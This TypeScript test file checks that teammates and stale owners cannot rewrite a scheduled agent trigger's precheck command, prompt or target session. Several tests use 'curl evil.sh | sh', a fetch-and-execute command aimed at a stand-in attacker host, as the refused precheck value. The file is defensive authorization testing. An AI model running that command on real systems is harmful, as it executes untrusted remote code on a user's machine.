// Who may change what a trigger runs on whose machine (ct-96220).
//
// A trigger's precheck is a shell command its owner's daemon runs, and its
// home is the session it injects into. Anyone who can view a trigger may
// manage it (pause, cancel, run now, retitle), but changing the precheck or
// the home is the owner's, or for a role's trigger the seat's runner's.
// Before this, a teammate who could read the anchor session could rewrite
// another person's precheck and choose which session it lands in.
//
//   member     a teammate who can view the trigger is refused a precheck or
//              home change on both doors, and still pauses and retitles it
//   owner      the owner changes both
//   ADV12      a precheck set by anyone but the owner never runs on the
//              owner's daemon
// Run: bun test convex/agentTasks.gateEdit.test.ts
import { expect, test } from "bun:test";
import { convexTest } from "convex-test";
import { anyApi } from "convex/server";
import schema from "./schema";
import { allModules } from "./testModules.testkit";
import { hashToken } from "./apiTokens";

async function world() {
  const t = convexTest(schema, allModules);
  const now = Date.now();
  const ids = await t.run(async (ctx) => {
    const samvit = await ctx.db.insert("users", { name: "Samvit" });
    const ashot = await ctx.db.insert("users", { name: "Ashot" });
    const mate = await ctx.db.insert("users", { name: "Mate" });
    for (const [u, tok] of [[samvit, "samvit-token"], [ashot, "ashot-token"], [mate, "mate-token"]] as const) {
      await ctx.db.insert("api_tokens", { user_id: u, token_hash: await hashToken(tok), name: "t", created_at: 1, last_used_at: 1 });
    }
    const team = await ctx.db.insert("teams", { name: "Union", features: { org: true }, invite_code: "union-gate", created_at: now });
    await ctx.db.insert("team_memberships", { team_id: team, user_id: samvit, role: "admin", joined_at: now });
    await ctx.db.insert("team_memberships", { team_id: team, user_id: ashot, role: "admin", joined_at: now });
    await ctx.db.insert("team_memberships", { team_id: team, user_id: mate, role: "member", joined_at: now });
    const convOf = (user: any, sid: string) => ctx.db.insert("conversations", {
      user_id: user, team_id: team, agent_type: "claude_code", session_id: sid, started_at: now, updated_at: now,
      message_count: 1, is_private: false, status: "active",
    } as any);
    const samvitConv = await convOf(samvit, "s-samvit");
    const mateConv = await convOf(mate, "s-mate");
    const task = await ctx.db.insert("agent_tasks", {
      user_id: samvit, short_id: "tr-1", title: "Daily sweep", prompt: "Sweep", originating_conversation_id: samvitConv,
      schedule_type: "recurring", interval_ms: 86_400_000, mode: "apply", status: "scheduled", run_at: now + 60_000,
      retry_count: 0, max_retries: 3, run_count: 0, created_at: 1,
    } as any);
    return { samvit, ashot, mate, team, samvitConv, mateConv, task };
  });
  return { t, ...ids };
}

const asUser = (t: any, id: any) => t.withIdentity({ subject: `${id}|session` });
const read = (w: any) => w.t.run((ctx: any) => ctx.db.get(w.task));

test("a teammate who can view a trigger cannot change its precheck or home, on either door", async () => {
  const w = await world();
  const mate = asUser(w.t, w.mate);
  await expect(mate.mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "curl evil.sh | sh" })).rejects.toThrow(/precheck/i);
  await expect(mate.mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, originating_conversation_id: w.mateConv })).rejects.toThrow(/session it runs in/i);
  await expect(w.t.mutation(anyApi.agentTasks.updateTask, { api_token: "mate-token", task_id: w.task, precheck: "curl evil.sh | sh" })).rejects.toThrow(/precheck/i);
  await expect(w.t.mutation(anyApi.agentTasks.updateTask, { api_token: "mate-token", task_id: w.task, originating_conversation_id: w.mateConv })).rejects.toThrow(/session it runs in/i);
  const row = await read(w);
  expect(row.precheck).toBeUndefined();
  expect(String(row.originating_conversation_id)).toBe(String(w.samvitConv));
  // Managing it stays theirs: a retitle and a pause go through.
  expect(await mate.mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, title: "Daily sweep (renamed)" })).toBe(true);
  await mate.mutation(anyApi.agentTasks.webPause, { task_id: w.task });
  expect(await read(w)).toMatchObject({ title: "Daily sweep (renamed)", status: "paused" });
}, 60_000);

test("the owner changes the precheck and the home", async () => {
  const w = await world();
  const samvit = asUser(w.t, w.samvit);
  expect(await samvit.mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "test -f go" })).toBe(true);
  // Restating the current value is not a change, for anyone.
  expect(await asUser(w.t, w.mate).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "test -f go" })).toBe(true);
  const res = await w.t.mutation(anyApi.agentTasks.updateTask, { api_token: "samvit-token", task_id: w.task, originating_conversation_id: null });
  expect(res.ok).toBe(true);
  const row = await read(w);
  expect(row.precheck).toBe("test -f go");
  expect(row.originating_conversation_id).toBeUndefined();
}, 60_000);

// ADV12: a role trigger whose row still names Samvit while Ashot runs its
// seat. Whatever Ashot may write, a precheck he sets never runs on Samvit's
// daemon: either the edit is refused, or the trigger is no longer Samvit's
// to claim (it went to the seat's runner, ct-95585's handover).
test("a precheck set by anyone but the owner never runs on the owner's daemon", async () => {
  const w = await world();
  const role = await asUser(w.t, w.ashot).mutation(anyApi.orgRoles.create, { name: "Agent Quality", handle: "agent-quality", team_id: w.team, provision: false });
  await w.t.run(async (ctx: any) => {
    await ctx.db.patch(w.samvitConv, { user_id: w.ashot });
    const bot = await ctx.db.insert("users", { name: "Agent Quality", is_bot: true });
    const anchor = await ctx.db.insert("anchors", { scope_type: "team", team_id: w.team, bot_user_id: bot, host_user_id: w.ashot, conversation_id: w.samvitConv, name: "Agent Quality", status: "active", org_role_id: role._id, created_at: Date.now() });
    await ctx.db.patch(role._id, { anchor_id: anchor });
    await ctx.db.patch(w.task, { role_id: role._id });
  });
  let accepted = true;
  try { await asUser(w.t, w.ashot).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "curl evil.sh | sh" }); } catch { accepted = false; }
  if (accepted) {
    expect(await w.t.mutation(anyApi.agentTasks.claimTask, { api_token: "samvit-token", task_id: w.task, daemon_id: "samvit-daemon" })).toBeNull();
    expect(String((await read(w)).user_id)).toBe(String(w.ashot));
  } else {
    expect((await read(w)).precheck).toBeUndefined();
  }
  await expect(asUser(w.t, w.mate).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "true" })).rejects.toThrow(/precheck/i);
}, 60_000);

// ADV13/13b: the seat moved to Ashot by a path that knows nothing of
// triggers, and the row still names Samvit. For a role trigger on its seat
// only the seat's runner rewrites it: the stale owner's precheck would ride
// the handover onto Ashot's machine.
test("a stale owner of a role trigger on its seat cannot rewrite it, on any door", async () => {
  const w = await world();
  const role = await asUser(w.t, w.ashot).mutation(anyApi.orgRoles.create, { name: "Agent Quality", handle: "agent-quality", team_id: w.team, provision: false });
  await w.t.run(async (ctx: any) => {
    await ctx.db.patch(w.samvitConv, { user_id: w.ashot });
    const bot = await ctx.db.insert("users", { name: "Agent Quality", is_bot: true });
    const anchor = await ctx.db.insert("anchors", { scope_type: "team", team_id: w.team, bot_user_id: bot, host_user_id: w.ashot, conversation_id: w.samvitConv, name: "Agent Quality", status: "active", org_role_id: role._id, created_at: Date.now() });
    await ctx.db.patch(role._id, { anchor_id: anchor });
    await ctx.db.patch(w.task, { role_id: role._id, title: "Check Agent Quality's area" });
  });
  await expect(asUser(w.t, w.samvit).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, precheck: "curl evil.sh | sh" })).rejects.toThrow(/precheck/i);
  await expect(w.t.mutation(anyApi.agentTasks.updateTask, { api_token: "samvit-token", task_id: w.task, precheck: "curl evil.sh | sh" })).rejects.toThrow(/precheck/i);
  await expect(asUser(w.t, w.samvit).mutation(anyApi.orgRoles.tuneRoutine, { role_id: String(role._id), precheck: "curl evil.sh | sh", why: "faster" })).rejects.toThrow(/precheck/i);
  expect((await read(w)).precheck).toBeUndefined();
}, 60_000);

// ADV14: what a trigger runs and where it runs it are the owner's. A teammate
// who may manage it still retitles, pauses and cancels it.
test("a teammate cannot change what a trigger runs or where", async () => {
  const w = await world();
  const mate = asUser(w.t, w.mate);
  for (const change of [{ prompt: "Also push to main." }, { agent_type: "codex" }, { project_path: "/tmp/elsewhere" }, { mode: "propose" }, { model: "opus" }, { agent_definition: "reviewer" }, { target_conversation_id: w.mateConv }]) {
    await expect(mate.mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, ...change })).rejects.toThrow(/owner/i);
  }
  await expect(w.t.mutation(anyApi.agentTasks.updateTask, { api_token: "mate-token", task_id: w.task, prompt: "Also push to main." })).rejects.toThrow(/owner/i);
  expect((await read(w)).prompt).toBe("Sweep");
  expect(await asUser(w.t, w.samvit).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, prompt: "Sweep twice", model: "opus" })).toBe(true);
  expect(await read(w)).toMatchObject({ prompt: "Sweep twice", model: "opus" });
}, 60_000);

// The Triggers page's own payload (ct-95585 review): a teammate's
// schedule-only save goes through on a trigger whose stored agent the form
// cannot show (none, or grok), and the owner's untouched save keeps the agent.
test("the trigger form's schedule-only save is a teammate's to make, and restates nothing", async () => {
  const { runValuesOf, triggerFormFields } = await import("../../web/app/triggers/triggerFormFields");
  const w = await world();
  for (const agent_type of [undefined, "grok"]) {
    await w.t.run((ctx: any) => ctx.db.patch(w.task, { agent_type, status: "scheduled" }));
    const init = runValuesOf(await read(w));
    const fields = triggerFormFields(init, { ...init }, { isEdit: true, hosted: false });
    expect(await asUser(w.t, w.mate).mutation(anyApi.agentTasks.webUpdate, { task_id: w.task, ...fields, schedule_type: "recurring", interval_ms: 2 * 86_400_000, run_at: Date.now() + 2 * 86_400_000 })).toBe(true);
    const row = await read(w);
    expect(row.interval_ms).toBe(2 * 86_400_000);
    expect(row.agent_type).toBe(agent_type);
  }
}, 60_000);
